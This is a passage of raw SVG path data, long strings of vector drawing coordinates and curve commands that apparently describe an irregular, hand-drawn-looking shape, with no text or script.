.3-.1.5-.1-.1.4.3.6 0 .8.4.3 1.3.2 1.8 0 1.6.5 3.3.4 5.6.5-.1.6-.8.7-1.5.9zm3.8-3.1c-.5-.5-1.9.2-2.1-.4.7-.2 1.4.1 2.2-.1 0 .3 0 .4-.1.5zm.1-7.5V30v-.1c.1 0 .1-.1.1-.2.6-.1.8.2 1.4.2-.1.7-.9.5-1.5.3zm1.4-2.6h-.5c.1 0 .1 0 .3-.1 0-.1.6-.3.3-.3.2-.3.2.3.5.2-.1.5-.6-.3-.6.2zm.5 7.3c0-.3.5-.2.7-.1 0 .3-.5.2-.7.1zm-.1-13.6c.6-.3.9-.5 1.5-.3 0-.2.1-.2.2-.2-.2.2-.3.2-.1.5-.4.1-1 .1-1.6 0zm3.6 7.9c-1.1.2-1.2 0-2.3-.1.4-.3 1-.4 1.5-.6.2.2.5.3.8.4v.3zm4.8-5.2l.1.1c0 .1-.3.1-.4-.1h.3zm-.8 2.7c.3-.3.9.1 0 0zM303 21c.4.1.9.2 1.2.4-.7 0-1.4.1-2.1.1.3-.2.7-.3.9-.5zm-.6 7.7l.1.1c-.3.2-.7.7-1 .4 0-.1-.1-.2-.1-.3.3-.1.6-.2 1-.2zm-1 1.7c.2-.8 1.2-.4 1.9-.6h.7c.1.8-1.4.6-2.6.6zm4.6-1.5c-.4.6-1.3.2-1.9.6H303.5c-.3-.2-.3-.5-.7-.6h-.1c0-.1 0-.2-.1-.3.4 0 .6-.2.7-.5.8-.2 1.8-.2 2.2.3.4-.1.7-.1 1.1 0-.3.4 0 .4.1.7-.2 0-.9.2-.7-.2zm.8-2.1c-.2 0-.1-.1 0-.1-.2-.3-.1-.1.3-.1-.1.1-.3.1-.3.2zm1.7-.1h-.4c-.3-.2.3-.2.4 0 0-.1 0 0 0 0zm.5 0v-.1c.4.1-.1.8 0 .1zm1.9-4.5c0 .1-.1.1-.1.1-.1-.1-.1-.2 0-.3 0 .1 0 .1.1.2zm1 .2c-.3 0-.4-.2-.8-.1v-.1c.3-.1.7.2.7 0h.1v.2zm0-.4c.1-.1.5-.3.6-.1h.1c-.3.1-.4.1-.7.1zm1 .4h-.3H312.9zm-.1-.2h-.4c-.1 0-.1.1-.1.1h-.3v-.2c.2 0 .4 0 .6-.1.1 0 .2.1.3.1 0 .1-.1.1-.1.1zm.1-.3c.2-.2.5-.2.8-.1-.1.1-.2.2-.4.2-.1 0-.2-.1-.3-.1 0 .1-.1.1-.1 0zm.2 3.4c0-.1.1-.1.1-.2h.2c0 .1-.1.2-.3.2zm.7-.8h-.2c-.1 0-.1-.1-.2-.2.4.1.5.2.4.2zm.4-3.4h-2.9c.7-.3 1.9-.8 2.9-.4v.4zm20.3-.5c.3.1-.2.2.1.3.1-.3.8-.3 1.2-.4-.3.4.2-.1.1.3.1 0 .1-.1.1-.1.1.2.3.3.4.4h-.1c-.3 0-.3.3-.5.3h-1.2c-.2 0-.4-.1-.6-.2-.1 0-.1.1-.1.1-.5-.1-.7-.3-.7-.6v-.2h.1c-.2.3.8.3.5 0 .3 0 .6.4.7.1zm-.6-.6c0 .2-.4-.1-.7.2h-.1c-.1-.1-.2-.1-.3-.1.4-.1.8-.1 1.1-.1zm-3.6 1.5zm-9.2-.2c.6-.1 2.2 0 3.2-.1 0 0 0 .1.1.1s.1 0 .1-.1c.2 0 .3-.1.5-.1V21c.6 0 .9 0 1.4-.1-.4.4-1 .7-1.7.9-.6-.1-1.2-.2-1.8-.2h-.2c.2.1-.1.1 0 0h-.1c-.1-.1-.3.1-.3.1-.2 0-.9-.3-1.4-.2l.2-.2zm-5.6 1.9l.1.1s-.1 0-.1-.1zm.2 2.2c-.2-.2-.3-.2-.5-.1h-.4c.1-.3.8-.2.9.1zm.5 1.6c-.6-.3-1.3.1-1.5-.3.1 0 .2 0 .2-.1.4.1.8.1 1.2.1.1.1.2.2.1.3zm.2-.1c0-.1-.1-.1-.1-.2h.5c.3 0-.1.2-.4.2zm.4-.4h-.5c.2-.4.7 0 1.2-.1.3.2-.5-.1-.7.1zm2.5-1.7c-.1-.1-.2-.1-.3 0-.1 0-.1-.1-.1-.2h.4v.2zm.5.9c-.1-.5.6-.2 0 0zm1.2-.1h-.2c-.1 0-.2 0 0 0h.2zm7.6-1.9c.1 0 .2.1.1.2 0-.1 0-.2-.1-.2zm2.3 0c-.2 0-.1-.3-.5-.2.3.2.2.3-.1.1 0-.1 0-.2-.1-.3h-.5s-.1.1 0 .1h.5v.1c-.4-.1-.9-.2-1.4-.2h-.5v-.1s0-.1-.1-.1c0 0-.1 0-.1.1v.1h-.4c-.2 0-.3 0-.4-.1 0-.1.1-.1.2-.2l.1-.1v-.1h-.1-.2c-.2.1-.3.3-.2.4h.2c-.3 0-.6.1-.8.2-.6 0-1.1 0-1.1.2-.3 0-.4-.1-.6.1v-.1s0-.1-.1-.1c0 0-.1 0-.1.1s0 .2.1.3h-.1c-.4 0-.3-.4-.5-.5-.6.2-1 .1-1.2.2-.2 0-.1-.1 0-.2-.6.2-1.5.1-1.6-.1-.1.1-.3.2-.4.3-.3-.1.2-.2-.1-.3-.9.3-1-.2-1.2.1-.3-.3-.4-.3-.6-.3.2-.1.7 0 1.1-.1 0-.2.6-.6.2-1 .1 0 .1-.1.2-.1 0 0 0 .1.1.1 0 0 .1 0 .1-.1.3.2 1.1.6 1.6.3.1 0 .2.1.4.1h-.2c0 .4-.1.7.3.9 1.4-.1 1.7.1 3.2.1.2-.2.2-.5-.1-.7.9-.2 1.9-.2 3-.2-.1.1-.3.1-.4.2 1 .1 1.5.4 2.8.3h.3v.4c-.5.2-.6.3-.7.4zm.6-.2zm.1-.1c0-.1 0-.1.1-.2.1.1.2.2.2.3-.1.1-.2 0-.3-.1zm.4-.2h-.2v-.1c.1 0 .2 0 .2.1 0-.1 0-.1 0 0 0-.1 0-.1 0 0zm6.9-.6s-.1 0 0 0h-.3-.1l-.1-.1v.2c-.1 0-.2-.2-.1-.2-.2 0-2.3.3-1.9.3h-.2v-.1c-.4-.2-1.1-.1-1.6-.1-.1 0-.1-.1-.2-.1s-.1 0-.1.1c-.1 0-.1 0-.1-.1-.1.1-.3.2-.5.3v-.2c-.3.3-.2.2-.8.3-.2-.1-.4-.2-.6-.2-.1 0-.2 0-.2.1h-.4s0 .1-.1.1H331.3h.1c.9-.6 1.8-.6 3.3-.5l-.1.1c.2 0 .4 0 .7-.1h.4l.1-.1c.4-.1.8-.1 1-.3.4.1.9.1 1.6.1h.2c.2.2.7.1 1 .2-.3.3-.5.3-.7.3zm15.6 17.2c.3-.3.6.4 0 0zm34.8-2.7c-.2-.2-1 0-1-.4.6 0 1.2-.1 1 .4zm-7.1-2.7c0 .2-.3.2-.7.2.2-.3.3-.3.7-.2zm-8.8-.3s.1 0 .1.1c.1 0 .1 0 .2-.1 1 0 1.9.1 2.8.2v.2c.1 0 .1.1.2.1-.9.3-2.1.1-3-.1-.6 0-1 .2-1.1-.3.2-.1.5-.1.8-.1zm1.4 1.7c-.1.4-1.3.4-1.5.1.2-.5 1.1-.3 1.5-.1zm-1.4 1.3c-.6.1-.6-.2-1.1-.2.2-.4 1.1-.1 1.1.2zM371 37h-.4c0-.1-.2-.1-.1-.3.2.1.5.1.5.3zm-1-2.1v.1c.1.1.2.1.3.2-.3.2-1.4.2-1.4-.2.1-.3.7-.2 1.1-.1zm-.3 2.2c-.6.1-1.2.1-2.1 0 0-.1-.1-.1-.1-.2.7-.3 2.1-.6 2.2.2zm-3.1-.5c.4-.1.4.1.7.1v.1c0 .1 0 .1.1.2h-.3-.1c-.2-.1-.6-.1-.4-.4zm-1.9-8.5c.1-.3.4 0 .3.2-.4.1-.4-.1-.7-.1.1-.3.3.1.5 0 .1-.1 0-.1-.1-.1zm.3-.7h-.2c-.2 0-.4-.1-.5-.1 0-.1-.1-.1 0-.2.3 0 .6 0 .7.3zm-5.2-4.3h.3v.2h-.3v-.2zm13.8 14.7c-.5.2-1.1.2-1.6.1-.8.4-3 .5-4 .1-2-.1-4.2.5-5.3-.5h.3c.4.1.9.1 1.3-.1.1 0 .1-.1 0-.1h-.1-.1c-.3.2-.7.1-1 .1h-.2v-.1c-.9-.1-1.8-.1-2.6.2-.6-.6-1.7-.5-2.6-.7 1.3.1 2.9-.5 4.4-.1.4.1.3-.3.5-.3.6 0 1 .1 1.2.3.5 0 .5-.4 1-.4.4.2.8.4 1.2.5v.6c.3 0 .6.2.9 0h.5v.1h.1v-.1c.9.1 1.7.2 2.3 0 .4.1.4-.1.7-.1h.3c.1 0 .2 0 .3-.1v.1c.7.5 1.6.6 2.5.5zm5.9 0c-.2.1-.3.3-.7.3 0 .3.6.3.4.7-.2 0-.2.1-.4.1h-.4-.1-.1c-.1-.1-.3-.2-.5-.3.1-.4.4-.5.1-.8-1.4 0-2.5.3-4 .1v-.2c.2-.2.7-.2.8-.4.6.2 1.2.2 1.7.2.4 0 .8 0 1.2.1h.1l.1-.1v-.2h-.2c-.4-.1-.8-.1-1.1-.1-.6 0-1.1 0-1.6-.2 0-.1-.1-.1-.3-.1 1.1-.6 2.7 0 3.8-.3 0 .2.4.2.5.3 0 .1.1.1.2.2h.1c0 .1.1.2.2.3 0 .1.1.1.1.1.1.2.1.3.1.3zm.2-.2c-.1 0-.1-.1-.2-.2.2 0 .2-.2.4-.2-.1-.2-.4-.2-.6-.3 0 0 0-.1-.1-.1v-.2c.8-.1 1.1.2 1.6.4l.2.2v.1c0 .6-.6.4-1.3.3zm1.3.7c.3-.4.5.3 0 0zm3.8-1.1c-.8.5-2.9 1.1-3.3 0l-.3-.3h-.1c.4-.5 1.5-.2 1.5.4.6-.3 1.7-.4 2.2-.1zm-.9-2.7c.4-.1.3.2.5.2 0 .2-.6 0-.5-.2zm16.6-3.4c.1-.9.1-.9-.3-1.3 0 .9-1 .3-.6 1.3-.5-.2-1.3-.1-1.5 0-.1-.1-.1-.2-.2-.3.3 0 .6 0 .7-.2-.3 0-.5 0-.5-.2.6.1.7-.2 1.2-.1.3-.3-.2-.6.3-.8h.6l.1.1c.3.3 1 1 .2 1.5zm5.8 5.7c-.4-.2-.4.2-.6.4-.1 0-.3-.1-.4-.1 0-.2-.5-.6-.4-.2-.1 0-.1 0-.2-.1h-.1c-.2-.3-.7-.7-.8-.5-.2 0-.1-.2 0-.4.1.1.1.1.2 0v-.3c-.1-.1-.1-.1-.2-.1h-.1v-.1c.1-.6 1.9-.4 2.9 0-.1.3-.3.6-.3 1.4zm28.8 4.4c-.5-.7-.8-.4-1.7-.4 0-.4-.1-.7-.3-.9.7-.4 1.2.1 2.1 0 .1.4.3.6.3 1.3h-.4zm3.1.7h-.5c-.5 0-.9 0-1.3-.2.4-1 .5-1.4 1.7-1.3 0 .6.4 1.1.1 1.5zm54.7 5.1c-.3.6-1.2.3-1.6.9 0-.6-.8.2-.6-.6-3.4-.1-7.1-.6-11.5-1.4 0-.7.6-.5.6-1.1 1.3.6 2.7-.1 3.8 0 .2 0 .5.4.7.4 1 .1 2.4-.1 4.1.5.8-1.6 3.7-1.9 4.4-.2-.2.6-.9.4-.9 1.3 1.1-.2.3.6 1 .2zm2.5-.6v.3c-.1.1-.2.2-.2.3 0 .6-.2-.3-.6 0 .1-.6.6-.4.8-.6zm-.9 3.2c0-.1 0-.2-.1-.2.2-.2.4-.3.7-.2 0 .3 0 .6.1.6-.1.7-.4-.2-.7-.2zm2.3-2.6c-.7-.2-.8-.1-1.4.2.1-.1.1-.2.2-.2h.1v-.1c0-.2 0-.4-.1-.8h.1c.3 0 .3.2.1.4.4.2.2-.7.7-.4-.1.3-.2.4 0 .6.1 0 .2-.2.1-.4.2.1.2.4.2.7zm15.2 5.5c-1 .4-1.7.3-2.4.8v.1c-.4-.1-.8-.2-1.2-.2-.3 0-.6 0-.8.1v-.1c-.5-.2-.9-.8-1.4-.4 0-1.4 1.2-.9 1.3-2.2.6-.1 1.2.1 1.8.3.6.2 1.2.4 1.9.4h.4c-.2.9.5.4.4 1.2zm4.4-2.2c-1.7.2-3.9-.8-5.3.4-.6.1-1.2-.1-1.8-.3-.5-.2-1.1-.4-1.6-.4h-.4c-1.9-.3-3.5-.4-4.8-1.1v-1.1c1.7.1 3.4 0 3.2-2.8.6-.5 1.1.3 1.1 1.3 1.1.1 2.4.8 3.7.5.6 1.1 1 2.7 2.4 2 0-1.2.4-.4.6-1.7.9-.6 1.4-.9 2 .2.8-.3.9.1 1.4.7.2 1.3-.5 1.3-.5 2.3zm115.2-1.2c-.1-.1-.3-.1-.5-.1-.1-.2.8-.2.5.1zm5.2-.4c-.1 0-.2.1-.1.2-.2 0-.2-.6.1-.4h.1c0 .1-.1.1-.1.2zm1.5.1c-.6-.4-.5 0-1.3-.1v-.1c.9.1 2-.8 3 0-.4.3-1.3-.5-1.7.2zm63-19.9c-.1 0-.2.1-.3.1v-.1h-.3s.1 0 .1-.1c.3 0 .4 0 .5.1zm-1.7-.1c.2 0 .2.1.3 0v-.1h.4c.1 0 .2.1.3.1-.3.1-.5 0-1 .2v-.1-.1zm-.3 0c.1 0 .1.1.1.1s-.1.1-.2.1l-.1-.1c0-.1.1-.2.2-.1zm-1.4.2c0 .2-.2.1-.3 0 .1-.1.2-.1.4-.1-.1 0-.3 0-.1.1zm.5-.5c-.1-.1-.3-.1-.4-.2.2 0 .5.1.4.2zm.5.5c.1 0 .1.1.2.1-.7.1-.8-.3-.2-.1zm.4 3.5c-.2-.1 0-.2 0-.3.2 0 0 .2 0 .3zm.3-1.2c-.1 0-.1 0 0 0-.1 0-.1 0 0 0-.1 0-.1 0 0 0v.1c-.4.1-.2-.3-.5-.3.1-.3.2.2.5.1v.1zm.9.1c-.2-.2-.3.1-.4-.1-.1 0-.2.1-.3.1v-.1c.3-.1.2 0 .6-.1 0 .1 0 .2.1.2zm-.2-2.8c-.1 0-.2-.1-.4-.1h-.2v-.1c.2-.3.7.1 1 .1-.4-.2.2-.4.1 0-.1 0-.1 0-.1.1-.1.1-.2.1-.4 0zm.8 2.8c-.1 0-.2-.1-.3-.1 0 0 0-.1-.1-.1.1 0 .1-.1.2-.1.1.1.1.2.2.3zm.4-.3c-.1 0-.2 0-.1.1-.1-.1-.1-.1-.1-.2s.1-.1.3-.1c-.1 0-.1.1-.1.2zm.1-1.9c-.1 0-.3-.1-.4-.2h.2v.1h.1c.1 0 .2 0 .1.1zm.7 0c-.2 0-.1-.3-.5-.2l-.1-.1c.4 0 .4-.2.4-.4 0 .3.7.4.2.7zm49.4 10c1.1.4 1.8-.2 2.6.1-.1.8-2.3.5-2.7.4-.1-.2.2-.2.1-.5zm2.4 2.5c-.5.5-1.6.2-2.3.3-1.8.1-2.6-.4-4.5-.3h-.1c.1-.1.1-.2.1-.2 2.2-.2 5-.3 6.8.2zm-2.9-8.1c0 .3-.6.2-.8.1 0-.2.5 0 .8-.1zm-.2 3.5c.2.2-.1.2.3.4-.7.6.2 1.2-.7 1.6 0 .2.5.1.4.3.2.8-1.7.6-2.6.4-.2 0-.8-.3-.4-.5-.3 0-.4.2-.7 0 0-.3.6-.2.4-.7.5-.1 1.1-.3 1.6-.4-.1-.1-.2-.2 0-.2 0-.1-.4 0-.4-.2 0-.8 1.3-.6 2.1-.7zm-2.6-3.3c0 .7-1.3.1-1.5.5-.2 0-.1-.2-.1-.3.7-.1.8-.5 1.6-.2zm-2-5.2c0 .1 0 .1-.1.1 0 .1.1.1.1.1-.2.3-.4-.2 0-.2zm-1.4 7c.5-.2 1-.6 1.2.1.4 0 .6-.4 1-.4.3.1 0 .6.5.5 0 .5-.7.5-1 .7-.1-.3-.4-.1-1-.1-.3 0-.6-.2-.8-.2-.2 0-.2.2-.4.2-.5.1-1.3-.2-1.8-.1-.6.1-1 .4-1.6.4-.1-.1-.4-.2-.5-.3-.4.4-1.7.4-2.2.4-.1-.4-.6-.5-1-.7.7-.5 1.8-.3 2.6-.6 0 .2.5.1.5.3 1-.2 2.4-.6 3.6-.5.3 0 .9 0 .9.3zm2.1 5.8v.1h-.4l-.1-.1c.2-.1.3-.1.5 0zm-.6.2c-.3 0-.5 0-.5-.2h.3c0 .1 0 .1.1.1l.1.1zm-1.9 0s0-.1 0 0c.4-.2.7-.3.9-.1 0 .2-.8.7-1 .2l.1-.1zm-.2-.1s0 .1-.1.1c-.3.2-.7.3-.8-.2.4.1.3-.3.7-.2 0 .1 0 .1.1.1h.1c.1.1 0 .2 0 .2zm-1.6-7.5c.1.1.2.2.3.2-.3 0-.3.1-.6-.1.1 0 .2 0 .3-.1zm-4.4.1h.2v.2c.9-.1 2.1-.3 3-.1-.6.4-2.1.1-3.4.2.1-.1.1-.2.2-.3zm-.8.2c-.3.4-1.4.2-1.8.5-.2-.2-.8-.1-1.2-.1-.7.3-1.6.2-1.9-.3 1.5-.3 3.1 0 4.9-.1zm-5.2-3.1c.4.1-.3.2-.3.3-.5-.1.3-.1.3-.3zm-2.2.3c0 .1 0 0 0 0zm.4 2.9c-.1.6-2 .4-2.6.3.3-.7 1.7-.5 2.6-.3zm-.4 2.3c-.6 0-1.2.2-1.6.1 0-.2.2-.4.3-.6.6 0 1.4-.1 1.3.5zm-1.2 2.1c.9-.1 1.7.3 2.2-.2.5-.1.3.4.7.4.5 0 .5-.3.8-.4 1.3.5 1.6-.4 2.9-.2.2.3.3.3.1.6 1.5 0 2.5-.5 4-.6-.1-.2-.3-.3-.3-.6 1.2-.4 1.5.7 2.5.7 0 .5-.5.3-.8.4 0 0-.1 0-.1-.1h-.1c-.1 0-.1 0-.2.1s-.1.2 0 .2c.1.1.2.1.2.1-.9.2-1.8.6-2.6 0-.5.7-1.8.2-2.6.7-.3 0-.3-.3-.1-.4-.4.1-.9.1-1 .4-1.4-.2-1.7.4-2.7-.2 0-.2.2-.2.1-.4-1.7 0-2.6.8-4.7.7.6-.2.2-.4 0-.7.1 0 .2 0 .3-.1.4.1 1.3-.1 1.4-.4zm-.9 4.6h-.4s0-.1-.1-.1c-.1-.1.6-.1.5.1zm-.5-4.5c-.2 0-.2.1-.3.1-.2 0-.1-.5.3-.4v.3zm0-6.8c-.4-.1-.9-.2-1.4.1-.3-.5-.6.3-1 0h-.1c.1-.1.3-.3.2-.5h1.1c.4.2.8.3 1.2.4zm-4.3 6.6c.3 0 .2-.3.6-.2.1.3-.2.4-.6.4v-.1-.1zm-.6-6.6c0-.1.1-.2.1-.3 0-.1-.1-.1-.1-.1-.1 0-.1 0-.1.1 0 0 0 .1-.1.1s-.2.1-.2.2c-.4-.3-1 0-1.2.2-.2-.1-.3-.1-.4-.2-.2 0-.2.3-.3.1h-.1c.1-.1.1-.3.1-.4v-.2c1-.4 2 0 3 0v.1h-.1s-.1 0 0 .1h.2v-.1c.2 0 .2-.1.4-.1 0 .1-.1.1-.1.2.9-.2.8 0 1.5.1 0 .1 0 .2-.1.3-.1-.1-.5-.2-.4.1-.2 0-.2-.1-.3-.2 0 .2-1.2-.3-1.8 0zm.4 6.8c-.1 0-.4.1-.9.2-.8-.4.3-.6.9-.2-.1-.1-.1 0 0 0zm-3.6.3c-.3-.5 1-1.1 1.6-.6 0 .6-1.4.1-1.6.6zm1 .7c-.2 0-.3-.1-.3-.3.2.1.3.2.3.3zm.6-9.5c.1 0 .2-.1.3-.1 0 0 .1 0 .1-.1 0 0 0 .1.1.1 0 .1-.2.1-.5.1zm.8-.3c.1-.1.3-.1.5-.1 0 .1 0 .2.1.2h-.1c-.1 0-.2 0-.1-.1-.1 0-.2.1-.1.2-.1 0-.2-.1-.3-.1v-.1zm.7-.1H723.9c-.2.1-.8.1-1.3 0zm0 .2zm3.3 10.1c-.5.5-1.6.6-2.5.4.5-.6 1.8-.5 2.5-.4zm.6-11.4c-.5.2-.9 0-1.3-.1.4 0 .8 0 1.2-.1 0 .1 0 .2.1.2zm-1.9-2.6c.1 0 .2.1.2.1.1 0 .1 0 .2.1h-.4-.1c0-.1 0-.1.1-.2zm.3.6h.2v.1c-.5.2-1.7.1-2.1 0 .2-.1.3-.2.6-.2.1.1.3.2.6.2.1 0 .2 0 .2-.1h.5zm.1-.7s-.1 0 0 0l-.1-.1c.1 0 .1 0 .1.1.1-.1.1-.1.2-.1v.2c-.1 0-.1-.1-.2-.1zm.3.8c.1 0 .1 0 0 0v-.2c.1 0 .1.1.1.2h-.1zm-1.1-2.6v.1c-.2 0-.3-.1-.6-.1.1-.3.4 0 .6 0zm-.8-.1c0 .1 0 .2.1.2h-.1c-.2.1-.8-.1-.8.1-.3-.4.6-.2.8-.3zm-3.6 1.2c.3 0 .6-.1.8-.2.3 0 .7 0 .9-.2.1.3 2.2.2 2.9.1.1.2.5.2.9.2h0c-.1.2-.1.3-.1.4h-.4c-.4.1-.5 0-1 0 .3.3-.3.1-.8.2.1-.2.2-.3.3-.4-.3 0-.5-.3-1 0v.1c-.1-.1-.3-.1-.4-.1h-.2l-.1.1c-.1 0-.2.1-.5.1 0-.1.2-.2.1-.4-.4.1-.3.1-.5-.1-.2 0-.1.3-.4.2 0-.1.1-.1.1-.2-.2 0-.3 0-.3.2-.1.2-.1.1-.3 0zm2.2 1c.2 0 .1.1 0 .1.4.2.7.1.1.3-.1-.1-.1-.2-.4-.2.1-.1.3-.1.3-.2zm-.3-.5s0-.1 0 0c0-.1.1-.1.1-.2h.3c0 .1-.2.1-.4.2zm-.9.6h-.2c-.3 0-.4.3-.5 0 .1-.1.2-.1.3-.2.1 0 .1.2.2.2h.2zm-.5-.3c0 .1-.2.2-.3.2h-.4v-.1c.4-.1.3 0 .7-.1zm-1.1.1v.4h-.1l-.6-.3c.2-.1.5-.1.7-.1zm-2.1.3s-.1 0-.1.1c0 0 0-.1.1-.1l-.1-.1.1.1zm-.3-1.7c.1 0 .1 0 .2.1-.1 0-.1.1-.2.1.1 0 .1-.1 0-.2zm-.1.3h-.1.1zm.2.2c-.1.1-.2.1-.3 0h.3zm0 1c0 .1 0 .1-.1.2-.3.3-.2-.5.1-.2zm-.3 0c-.1.1-.2.2 0 .2 0 .3-.6-.3-.7.1-.1-.4-.1.1-.5-.1.2-.7.5 0 1.2-.2zm-.4-1.4v.2c-.1 0-.1 0-.1-.1-.1 0-.2.1-.3.2-.1 0-.2 0-.2.1-.1 0-.2-.1 0-.1 0-.4-.5.2-.4-.1-.2 0 .8-.2 1-.2zm-2 .1h.3v.2h-.4c.1 0 .1-.1.1-.2zm-.4-.1c.1 0 .2.1.3.2v.1c-.2.1-.3-.1-.3.1h-.1c0-.2 0-.3.1-.4zm-.4 1c.4.4.3.1 1.2.2l-.2.2h-.4c-.2 0-.4-.1-.7.1-.3 0 .2-.3.1-.5zm-1.8.3s.1.1.2.1c0 .1-.2.1-.3.1 0-.1 0-.2.1-.2zm-2 .1c-.5-.2.7-.2 0 0zm-3.2-.4c.1-.2.9 0 .8.2-.3-.2-.2 0-.5 0 0-.2-.1-.2-.3-.2 0 .1 0 0 0 0zm-.5.1h.3l.1.1h-.5l.1-.1zm2.3 2.4s.2.2.3.2c.4 0 .8-.1 1.1-.1l-.1.2c.3 0 .6-.2.8-.2 1-.1 2.2 0 3 0 .7 0 1.5.3 2.2.2.2 0 .3-.2.5-.2.3 0 .6.2 1 .2.2 0 .2-.2.3-.2.1 0 .4 0 .7.1h-.1c-.2 0-.3 0-.4-.1h-.2c-.1 0 0 .1 0 .1.2.1.3.1.5.1.2.2 1.7.3 1.5-.2h-.1s.1 0 .1-.1c.1 0 .2.1.1.2 1.5-.4 2.1.3 3.2-.2-.2.4 1.7-.4 2.1.1.1 0 .2-.2 0-.2 0-.2.4 0 .3.2-.2.3 0 .6.5.8h-2.1c-.2 0-.4.1-.7 0h-.1c-.2 0-.5 0-.7.1 0 0-.1 0-.1.1-.1 0-.2.1-.2.1-.1 0-.2.1-.3.1 0-.2-.4.1-.5-.2H721.4l.1-.1s0-.1-.1-.1h-.8c-.1-.1-.3-.2-.5-.2s-.4 0-.6.1c-.1 0-.1-.1-.1-.2-2-.1-4.2.1-6-.2-.2.3-.5.1-.8.1-.2 0-.4.2-.5.2-.3 0-.4-.3-.8-.3h-.8l.1-.1h.1c.1 0 .1 0 .1-.1 0 0-.1-.1-.2-.1h-.2c-.1 0-.1.1-.2.1h-.1c-.6 0-1.2 0-1.5-.2.1 0 .2 0 .3-.1v-.1h-.1c-.1 0-.1 0-.2.1 0 0-.1-.1-.2-.1s-.2.2 0 .2c-.2.2-.6.1-.9 0-.5.5-.5.4-.5.4h.2s.1 0 .1-.1c0 0 0-.1-.1-.1h-.2-.1-1.2-.4v-.1c.7-.1 1.9-.3 2.9-.1zM720 30c-.4 0-.5.1-.5.3-.2 0-.2-.1-.3-.2.2-.1.6-.3.8-.1zm-7.6.8h-.4-.1c.2-.1.6-.3.5 0zm-3.1.1v.1h-.3v-.1c0-.1.1-.1.3 0zm-.6.5c-.1.5-.2-.3-.6-.2-.1-.1-.1-.1-.1-.2 0 0 0-.1.1-.1 0 0 0 .1.1.1 0 0 .1 0 .1-.1v-.1c.3-.2.3 0 .5.1-.2.3-.2.4-.1.5zm-2.8-2.1c-.1-.1-.1-.1 0 0l-.2-.2h1.1c0 .1.1.2.1.3-.6-.2-.5-.2-1-.1zm-.3.1v-.1c.1-.1.1 0 0 .1h.2-.1-.1zm.1 1.5l-.1.1h-.1s0-.1-.1-.1h.1c0-.1.1-.1.2 0zm-2.7.5c-.5-.1.2-.2.1-.3.4 0-.2.1-.1.3zm.7-.7c-.1 0 .4.1.4.1 0 .1-.8.1-.4-.1zm-.2-1.5c-.1 0-.2-.1 0-.1 0-.1-.2-.1-.3 0-.4 0 .2-.2 0-.4.2.1.5.6.4 0 .1 0 .1.1.1.1 0 .2.1.2.3.1v.1c-.1.1-.4 0-.5.2zm.6-.5c-.1 0-.1 0 0 0-.1 0-.1.1 0 0h-.1l-.1-.1c-.3-.3.8-.1 1.1-.1v.2c-.2 0-.3 0-.7.1-.1 0-.2-.1-.2-.1zm.9 2.6c.3-.2 0-.3-.3-.4-.3-.2.3 0 .5.1l.1.1h.1c.1 0 .2 0 .2-.1l.2-.2v.1h.3c.3-.2-.2.2-.4.2 0 .2.6.1.7 0h.1c-.4.4-.8.2-1.5.2zm1.8-.2c-.1-.1-.3-.1-.4-.2.2-.2.4.1.7-.1h.1c-.1.1-.1.2-.1.3-.1 0-.1.1-.2.1 0 0-.1 0-.1-.1zm.2.2s.1 0 0 0c.1-.1.2-.1.2-.2V31v-.1h.5c0 .1.1.2.2.3-.3.1-.5.1-.9.1zm1.8 7.3v.1c-.2.1-.7.1-1.1.1-.1-.3.4-.2.3-.5.4.2.5 0 .8.3v-.1c.1.1 0 .1 0 .1zm.2-7.5h.4l.1.1-.1.1h-.4c-.1-.1-.1-.1 0-.2zm.1 7.8v-.2H709.4v.2h-.3zm.3-7.5c0-.1.1-.2.1-.2l-.1-.1V31c.2 0 .3.2.3.4.7-.1-.2-.6.5-.3v.1s0 .1.1.1c0 0 .1 0 .1-.1v-.1c.3.3.7-.2.8.2.1 0 .2-.1.1-.2.2 0 .2.2.4.2s.2-.2.4-.2h.4c.6-.1 1.3.2 1.8-.1.1.4.1-.1.5.1h.1s-.1.1-.1.2c0 0 0 .1.1.1h.1s0-.1.1-.1c.3-.1.2-.1.6 0h.1s-.1.1-.1.2c0 0 0 .1.1.1h.1v-.1c.8 0 1.4.1 2.7 0v.2c.2 0 .3-.1.5-.1h.1c0 .1-.1.1-.1.2v.1s0 .1.1.1c0 0 .1 0 .1-.1v-.1-.1c.4-.1.5 0 .9 0v.6c-.4-.1-.7-.1-1.2.2.1-.5-.8.4-.8-.2.2 0 .2.1.4.1-.3-.6-.9.4-1.1-.4-.4.2 0 .3-.4.3s.3-.3-.3-.2c-.1.5-1.9-.6-2.2.2-.2-.4-.7-.2-.8-.2-.1 0-.3-.6-.4-.1 0 .1-.2-.3-.5-.4-.4.1.1.2 0 .4-.2-.1-.6-.1-1-.1.3.3-.3 0-.5.3h-.1c.1-.1.2-.2.3-.2h.1s0-.1-.1-.1h-.1c-.2 0-.3.1-.4.2-.4-.2-1.2-.3-1.2 0-.2-.4-.4-.5-.5-.7zm7.6 7.2c.4 0 .5.1.8.2-.1.4-.7.4-1 .7-.2-.1-.3-.2-.4-.3 0-.4.7-.2.6-.6zm-2.3.5c-1 0-2.2.5-2.1-.2-.1-.1-.8.4-.8-.2.8-.3 2.7-.9 2.9.4zm-4.9-.2c0-.1 0-.1 0 0v-.2-.2c.5-.1.5.3.8.3-.1.2-.6.2-.8.1zm1.2 5.8c.3-.7 1.9-1.3 2.2-.5 0 .8-1.5.9-2.2.5zm6.1-.6c-.3-.1-1 .2-.8-.2.3.1 1-.2.8.2zm6.6 2.8c-1.2.3-2.5.3-4 .1 0-.2-.5-.1-.5-.2.9-1.1 3.8-.3 5-.3-.1.2-.2.3-.5.4zm9.6-1.5c-.2-.3.4-.1.4-.3.2 0 .4 0 .6-.1.3 0 .7 0 1-.1.2.1.4.1.6.1h.3c-.1.9-1.7.2-2.9.4zm6.4.1c-.7-.1-1.7.3-1.4-.5.5-.3 1.4-.2 1.8.1 0 .2-.3.1-.4.4zm14 .3c0-.1 0-.2.1-.2 0-.2-.7.1-.8.2-.2 0-.3-.2-.3-.4-.3.2-1.3-.2-1.8-.1-.2 0-.2.2-.4.2-1.5 0-3-.5-4.4-.5-.5 0-1.3.5-1.2-.1-.4 0-.7 0-.8.2-.3-.2-.2-.3-.1-.5 1-.3 2.2.1 3 .1.1 0 .1-.1.1-.2 1.3-.1 2.5 0 3.8 0h.3c1.1.2 2 0 2.9.7.6-.3 1.5-.5 1.5.3-.7.3-1.1.5-1.9.3zm.8-1.5c-.9-.4-2.2-.3-3.2-.1h-.4c-.8 